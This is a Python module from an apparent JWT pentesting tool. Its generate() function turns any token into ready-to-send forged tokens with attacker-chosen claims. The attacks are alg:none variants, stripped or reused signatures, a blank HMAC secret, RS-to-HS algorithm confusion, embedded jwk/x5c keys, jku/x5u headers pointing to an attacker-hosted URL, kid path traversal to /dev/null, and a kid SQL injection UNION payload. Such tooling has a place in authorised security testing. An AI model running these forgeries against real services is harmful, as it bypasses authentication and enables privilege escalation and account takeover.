"""
attacks.py — turns the jwt_core primitives into named attacks.

The headline function is `generate()`: give it a token (and optionally a target
public key + an attacker-controlled URL) and it returns every tamperable variant
at once, each as a ready-to-send token plus a human explanation of what it tests.
"""

from __future__ import annotations

import copy
import json
from typing import Any, Optional

import jwt_core as jc


def _apply_claims(payload: Any, claims: Optional[dict]) -> Any:
    """Merge attacker claim overrides (e.g. {"admin": true}) into the payload."""
    if not isinstance(payload, dict) or not claims:
        return payload
    out = copy.deepcopy(payload)
    for k, v in claims.items():
        out[k] = v
    return out


def _entry(id, name, category, token, header, payload, signing_desc,
           notes="", requires=None, severity="info", artifact=None):
    return {
        "id": id, "name": name, "category": category,
        "token": token, "header": header, "payload": payload,
        "signing": signing_desc, "notes": notes,
        "requires": requires or [], "severity": severity,
        "artifact": artifact,
    }


def craft_key_injection(token: str, mode: str, url: Optional[str] = None,
                        claims: Optional[dict] = None,
                        private_key: Optional[str] = None,
                        alg: str = "RS256") -> dict:
    """
    Build ONE key-injection token and return it plus whatever you must host.

    mode:
      "jwk" — embed our public key in the header (nothing to host)
      "x5c" — embed a self-signed cert in the header (nothing to host)
      "jku" — header points at `url`; host the returned JWKS there
      "x5u" — header points at `url`; host the returned certificate there
    """
    if alg not in ("RS256", "RS384", "RS512", "PS256", "PS384", "PS512"):
        raise ValueError("Key injection uses an RSA algorithm (RS*/PS*).")
    dec = jc.decode_token(token)
    payload = _apply_claims(dec.payload, claims)
    header = copy.deepcopy(dec.header)
    header["alg"] = alg
    for stale in ("jwk", "jku", "x5u", "x5c", "kid"):
        header.pop(stale, None)

    if mode in ("jku", "x5u") and not url:
        raise ValueError(f"{mode} needs a URL you control.")

    # key material: reuse a pasted private key, or mint a fresh one
    if mode == "x5c" or mode == "x5u":
        km = jc.generate_self_signed_cert(private_pem=private_key)
    else:
        km = jc.generate_rsa(2048) if not private_key else _material_from_priv(private_key)
    priv = km["private_key"]
    jwk = dict(km["jwk"]); jwk["kid"] = "jwtforge"

    artifact = None
    if mode == "jwk":
        header["jwk"] = jwk
    elif mode == "x5c":
        header["x5c"] = [km["x5c"]]
    elif mode == "jku":
        header["jku"] = url; header["kid"] = "jwtforge"
        artifact = {"type": "jwks", "host_at": url, "content": {"keys": [jwk]}}
    elif mode == "x5u":
        header["x5u"] = url
        artifact = {"type": "cert", "host_at": url, "content": km["cert_pem"]}
    else:
        raise ValueError(f"Unknown injection mode: {mode!r}")

    tok = jc.encode_token(header, payload, {"method": "rsa", "alg": alg, "private_key": priv})
    return {
        "token": tok, "header": header, "payload": payload,
        "artifact": artifact,
        "keypair": {"private_key": priv, "public_key": km["public_key"], "jwk": jwk},
    }


def _material_from_priv(private_pem: str) -> dict:
    key = jc._load_private_key(private_pem)
    return jc._key_material(key)


def generate(token: str,
             claims: Optional[dict] = None,
             public_key: Optional[str] = None,
             attacker_url: Optional[str] = None) -> dict:
    dec = jc.decode_token(token)
    base_payload = _apply_claims(dec.payload, claims)
    orig_alg = dec.header.get("alg", "")
    out: list[dict] = []
    artifacts: dict[str, Any] = {}

    # ---- 1. alg:none family --------------------------------------------------
    for variant in ["none", "None", "NONE", "nOnE"]:
        h = copy.deepcopy(dec.header); h["alg"] = variant
        tok = jc.encode_token(h, base_payload, {"method": "none"})
        out.append(_entry(
            f"none_{variant}", f"alg: {variant}", "Signature bypass",
            tok, h, base_payload, "empty signature",
            notes="Server accepts unsigned tokens if it honours the 'none' alg.",
            severity="critical",
        ))

    # ---- 2. null / stripped signature, alg unchanged -------------------------
    tok = jc.encode_token(dec.header, base_payload, {"method": "keep", "signature": ""})
    out.append(_entry(
        "null_sig", "Stripped signature (alg unchanged)", "Signature bypass",
        tok, dec.header, base_payload, "no signature, original alg",
        notes="Some libraries verify only if a signature is present.",
        severity="high",
    ))

    # ---- 3. keep the ORIGINAL signature, tamper the payload ------------------
    #        (the PortSwigger 'signature never checked' case)
    if dec.signature_b64:
        tok = jc.encode_token(dec.header, base_payload,
                              {"method": "keep", "signature": dec.signature_b64})
        out.append(_entry(
            "keep_sig", "Tamper payload, keep original signature", "Signature bypass",
            tok, dec.header, base_payload, "original signature reused verbatim",
            notes="Works when the server decodes the JWT but never verifies it.",
            severity="critical",
        ))

    # ---- 4. blank / empty HMAC secret ---------------------------------------
    if orig_alg.startswith("HS") or orig_alg in ("", None):
        alg = orig_alg if orig_alg.startswith("HS") else "HS256"
        h = copy.deepcopy(dec.header); h["alg"] = alg
        tok = jc.encode_token(h, base_payload, {"method": "hmac", "alg": alg, "secret": ""})
        out.append(_entry(
            "blank_secret", "Blank HMAC secret", "Weak key",
            tok, h, base_payload, f"{alg} signed with empty secret",
            notes="Server misconfigured with an empty signing key.",
            severity="high",
        ))

    # ---- 5. algorithm confusion (RS/EC -> HS using the public key) ----------
    if public_key:
        pub_pem = public_key.strip()
        # allow a JWK to be pasted instead of PEM
        if pub_pem.startswith("{"):
            try:
                pub_pem = jc.public_pem_from_jwk(json.loads(pub_pem))
            except Exception as e:
                artifacts["public_key_error"] = f"Could not parse JWK: {e}"
                pub_pem = None
        if pub_pem:
            # the exact bytes matter; offer the two most common representations
            reprs = {
                "pem_as_is": pub_pem,
                "pem_trailing_newline": pub_pem if pub_pem.endswith("\n") else pub_pem + "\n",
            }
            for rid, secret in reprs.items():
                h = copy.deepcopy(dec.header); h["alg"] = "HS256"
                tok = jc.encode_token(h, base_payload,
                                      {"method": "hmac", "alg": "HS256", "secret": secret})
                out.append(_entry(
                    f"confusion_{rid}",
                    f"Algorithm confusion (RS→HS, {rid})", "Key confusion",
                    tok, h, base_payload, "HS256 using the RSA public key as the HMAC secret",
                    notes="Server verifies RS256 but can be tricked into HS256 with the "
                          "public key as secret. Byte-exact key required — try both reprs.",
                    severity="critical",
                ))
    else:
        out.append(_entry(
            "confusion_needs_key", "Algorithm confusion (RS→HS)", "Key confusion",
            None, None, None, "needs the target public key",
            notes="Paste the server's RSA/EC public key (PEM or JWK) to build this.",
            requires=["public_key"], severity="critical",
        ))

    # ---- 6. embedded jwk (self-signed, key smuggled in the header) ----------
    kp = jc.generate_rsa(2048)
    artifacts["generated_keypair"] = kp
    jwk = dict(kp["jwk"]); jwk["kid"] = "jwtforge"
    h = copy.deepcopy(dec.header); h["alg"] = "RS256"; h["jwk"] = jwk
    h.pop("jku", None); h.pop("x5u", None)
    tok = jc.encode_token(h, base_payload,
                          {"method": "rsa", "alg": "RS256", "private_key": kp["private_key"]})
    out.append(_entry(
        "embed_jwk", "Embedded JWK (self-signed key in header)", "Key injection",
        tok, h, base_payload, "RS256 signed with a key we generated & embedded",
        notes="Works when the server trusts the 'jwk' header parameter (CVE-2018-0114).",
        severity="critical",
    ))

    # ---- 6b. embedded x5c (self-signed cert smuggled in the header) ---------
    cert = jc.generate_self_signed_cert(private_pem=kp["private_key"])
    artifacts["generated_cert"] = {"cert_pem": cert["cert_pem"], "x5c": cert["x5c"]}
    hc = copy.deepcopy(dec.header); hc["alg"] = "RS256"; hc["x5c"] = [cert["x5c"]]
    hc.pop("jwk", None); hc.pop("jku", None); hc.pop("x5u", None)
    tok = jc.encode_token(hc, base_payload,
                          {"method": "rsa", "alg": "RS256", "private_key": kp["private_key"]})
    out.append(_entry(
        "embed_x5c", "Embedded x5c (self-signed cert in header)", "Key injection",
        tok, hc, base_payload, "RS256 signed with our key; cert embedded via x5c",
        notes="Works when the server trusts the 'x5c' certificate chain in the header.",
        severity="critical",
    ))

    # ---- 7. jku header injection --------------------------------------------
    jwks = {"keys": [jwk]}
    if attacker_url:
        h2 = copy.deepcopy(dec.header); h2["alg"] = "RS256"
        h2["jku"] = attacker_url; h2["kid"] = "jwtforge"
        h2.pop("jwk", None); h2.pop("x5u", None)
        tok = jc.encode_token(h2, base_payload,
                              {"method": "rsa", "alg": "RS256", "private_key": kp["private_key"]})
        out.append(_entry(
            "jku_inject", "jku header injection", "Key injection",
            tok, h2, base_payload, "RS256; jku points at your JWKS",
            notes=f"Host the JWKS below at {attacker_url} so the server fetches our key.",
            severity="critical",
            artifact={"host_at": attacker_url, "jwks": jwks},
        ))
        artifacts["jwks_to_host"] = {"url": attacker_url, "content": jwks}
    else:
        out.append(_entry(
            "jku_needs_url", "jku header injection", "Key injection",
            None, None, None, "needs an attacker-controlled URL",
            notes="Provide a URL you control that will serve the JWKS.",
            requires=["attacker_url"], severity="critical",
        ))

    # ---- 7b. x5u header injection (cert hosted at attacker URL) --------------
    if attacker_url:
        hx = copy.deepcopy(dec.header); hx["alg"] = "RS256"
        hx["x5u"] = attacker_url; hx.pop("jwk", None); hx.pop("jku", None)
        tok = jc.encode_token(hx, base_payload,
                              {"method": "rsa", "alg": "RS256", "private_key": kp["private_key"]})
        out.append(_entry(
            "x5u_inject", "x5u header injection", "Key injection",
            tok, hx, base_payload, "RS256; x5u points at your hosted certificate",
            notes=f"Host the certificate (PEM) below at {attacker_url}.",
            severity="critical",
            artifact={"host_at": attacker_url, "cert_pem": cert["cert_pem"]},
        ))
        artifacts["cert_to_host"] = {"url": attacker_url, "pem": cert["cert_pem"]}
    else:
        out.append(_entry(
            "x5u_needs_url", "x5u header injection", "Key injection",
            None, None, None, "needs an attacker-controlled URL",
            notes="Provide a URL you control that will serve the certificate.",
            requires=["attacker_url"], severity="critical",
        ))

    # ---- 8. kid path traversal -> empty file -> empty HMAC key --------------
    for kid_val, label in [
        ("../../../../../../../../dev/null", "kid → /dev/null"),
        ("/dev/null", "kid → /dev/null (absolute)"),
    ]:
        h = copy.deepcopy(dec.header); h["alg"] = "HS256"; h["kid"] = kid_val
        h.pop("jwk", None); h.pop("jku", None)
        tok = jc.encode_token(h, base_payload, {"method": "hmac", "alg": "HS256", "secret": ""})
        out.append(_entry(
            f"kid_traversal_{'abs' if kid_val.startswith('/') else 'rel'}",
            f"kid path traversal ({label})", "kid injection",
            tok, h, base_payload, "HS256 with empty key (file resolves to empty)",
            notes="If 'kid' selects a key by file path, point it at an empty file "
                  "and sign with an empty secret.",
            severity="high",
        ))

    # ---- 9. kid SQL injection (return a known key) --------------------------
    known = "jwtforge"
    h = copy.deepcopy(dec.header); h["alg"] = "HS256"
    h["kid"] = f"nonexistent' UNION SELECT '{known}"
    tok = jc.encode_token(h, base_payload, {"method": "hmac", "alg": "HS256", "secret": known})
    out.append(_entry(
        "kid_sqli", "kid SQL injection", "kid injection",
        tok, h, base_payload, f"HS256 signed with '{known}'",
        notes="If 'kid' is used in a SQL lookup, inject a UNION that returns a key "
              "you know, then sign with that key.",
        severity="high",
    ))

    return {
        "input": {"header": dec.header, "payload": dec.payload,
                  "signature": dec.signature_b64, "alg": orig_alg},
        "applied_claims": claims or {},
        "generated": out,
        "artifacts": artifacts,
    }
